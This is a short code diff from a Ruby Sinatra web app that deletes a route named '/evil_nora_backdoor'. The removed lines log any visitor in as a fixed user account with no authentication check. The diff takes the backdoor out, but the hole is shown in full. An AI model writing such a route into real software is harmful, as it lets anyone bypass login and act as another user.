@@ -97,18 +97,6 @@ class Instabil::App < Sinatra::Base
     Course.all.map{ |p| p.api_attributes }.to_json
   end
   
-  get '/evil_nora_backdoor' do
-    user = Person.find_or_initialize_by uid: "zimmernobackdoor"
-    user.uid = "zimmernobackdoor"
-    unless user.name
-      user.name = "Nora Zimmer (temporär)"
-      user.save!
-    end
-    
-    warden.set_user user
-    redirect "/"
-  end
-  
   get '/preferences' do
     authenticate!
     @person = current_user
